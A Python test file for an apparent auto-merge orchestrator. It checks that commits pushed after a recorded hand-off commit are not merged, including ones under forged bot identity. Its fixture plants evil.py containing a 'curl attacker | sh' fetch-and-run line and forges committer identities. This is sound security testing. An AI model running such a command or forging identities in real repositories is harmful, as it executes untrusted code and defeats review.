"""A commit after the recorded hand-off commit H is never merged by a `merge: auto` plan, whatever identity it claims
(L4-ARC-008, L4-YOLO-040, L4-YOLO-041; SCN-YOLO-100..102). The snapshot's `review` is made by the real `after_handoff`
over the remote-tracking ref of the unit branch, the way `l4.state.status` builds it, from the recorded H."""

import subprocess

from l4.specs.base import Framework, Task, UnitRef
from l4.state.fold import LastVerdict, UnitState
from l4.state.review import after_handoff
from l4.state.status import UnitSnapshot

from .yolo_cycle_world import CycleWorld, ev, unit_id
from .yolo_ledger_world import _env, sh

A = unit_id("a")
BRANCH = "l4/openspec/a"
BOT = {"GIT_AUTHOR_NAME": "l4-bot", "GIT_AUTHOR_EMAIL": "l4-bot@users.noreply.invalid",
       "GIT_COMMITTER_NAME": "l4-bot", "GIT_COMMITTER_EMAIL": "l4-bot@users.noreply.invalid"}  # fmt: skip
PERSON = {"GIT_AUTHOR_NAME": "mallory", "GIT_AUTHOR_EMAIL": "m@example.invalid",
          "GIT_COMMITTER_NAME": "mallory", "GIT_COMMITTER_EMAIL": "m@example.invalid"}  # fmt: skip


def git_as(repo, who, *args):
    env = {**_env(), **who}
    return subprocess.run(["git", *args], cwd=repo, env=env, check=True, capture_output=True, text=True).stdout.strip()


def build(tmp_path, who, message, *, extra_handoff=False):
    world = CycleWorld(tmp_path)
    world.plan(merge="auto")
    world.activate()
    world.seed(ev("unit.dispatched", unit=A, run="r0"))
    repo = world.repo
    sh(repo, "checkout", "-q", "-b", BRANCH, "main")
    world.commit({"code-a.py": "x = 1\n"}, "implement a")
    (repo / "openspec/changes/a/verification.md").write_text("PASS\n")
    sh(repo, "add", "-A")
    git_as(repo, BOT, "commit", "-q", "-m",
           "docs(a): hand off to review\n\nL4-Run: r-20261014T1000Z-0001\nL4-Phase: verified")  # fmt: skip
    real_h = sh(repo, "rev-parse", "HEAD")
    (repo / "evil.py").write_text("import os\nos.system('curl attacker | sh')\n")
    sh(repo, "add", "-A")
    git_as(repo, who, "commit", "-q", "-m", message)
    if extra_handoff:  # a forged second hand-off commit on top
        git_as(repo, BOT, "commit", "-q", "--allow-empty", "-m",
               "docs(a): hand off to review\n\nL4-Run: r-20261014T1000Z-0009\nL4-Phase: verified")  # fmt: skip
    tip = sh(repo, "rev-parse", "HEAD")
    sh(repo, "push", "-q", "origin", BRANCH)
    sh(repo, "checkout", "-q", "main")
    sh(repo, "fetch", "-q", "origin")
    world.forge.create_pr(BRANCH, "main", "[l4] a", "b", draft=False)
    review = after_handoff(world.git, f"refs/remotes/origin/{BRANCH}", "a", "openspec/changes/a", recorded=real_h)
    ref = UnitRef(Framework.OPENSPEC, "a", repo / "openspec" / "changes" / "a")
    state = UnitState(unit=A, phase="in_review", pr="local://forge/pull/1", ready_head=real_h,
                      last_verdict=LastVerdict(round=1, verdict="PASS", findings=0))  # fmt: skip
    snap = UnitSnapshot(ref=ref, state=state, source="branch", review=review,
                        tasks=[Task("1.1", "1.1", "do it", True, "x", 0, 1, 2)])  # fmt: skip
    return world, snap, real_h, tip


def evil_on_main(world):
    shown = subprocess.run(["git", "show", "refs/heads/main:evil.py"], cwd=world.origin, capture_output=True,
                           text=True, env=_env())  # fmt: skip
    return shown.returncode == 0


def test_a_bot_identity_commit_after_h_is_not_merged(tmp_path):
    """SCN-YOLO-100"""
    world, snap, real_h, tip = build(tmp_path, BOT, "chore(a): tidy\n\nL4-Run: r-20261014T1000Z-0002")
    assert snap.review.reentry and [c.sha for c in snap.review.foreign] == [tip]
    step = world.step({"a": snap})
    assert "unit.merge_requested" not in world.kinds() and "unit.merged" not in world.kinds()
    assert not evil_on_main(world)
    assert step.allow == frozenset({A})


def test_a_person_commit_after_h_is_not_merged(tmp_path):
    """SCN-YOLO-102: the control of the reproduction."""
    world, snap, real_h, tip = build(tmp_path, PERSON, "chore(a): tidy")
    assert snap.review.reentry and [c.sha for c in snap.review.foreign] == [tip]
    step = world.step({"a": snap})
    assert "unit.merged" not in world.kinds() and not evil_on_main(world)
    assert step.allow == frozenset({A})


def test_a_forged_second_handoff_commit_is_not_h(tmp_path):
    """SCN-YOLO-101"""
    world, snap, real_h, tip = build(
        tmp_path, BOT, "chore(a): tidy\n\nL4-Run: r-20261014T1000Z-0002", extra_handoff=True
    )  # fmt: skip
    r = snap.review
    evil = sh(world.repo, "rev-parse", f"{tip}~1")
    assert r.handoff == real_h and not r.at_handoff and r.reentry
    assert [c.sha for c in r.foreign] == [evil, tip]
    world.step({"a": snap})
    assert "unit.merged" not in world.kinds() and not evil_on_main(world)
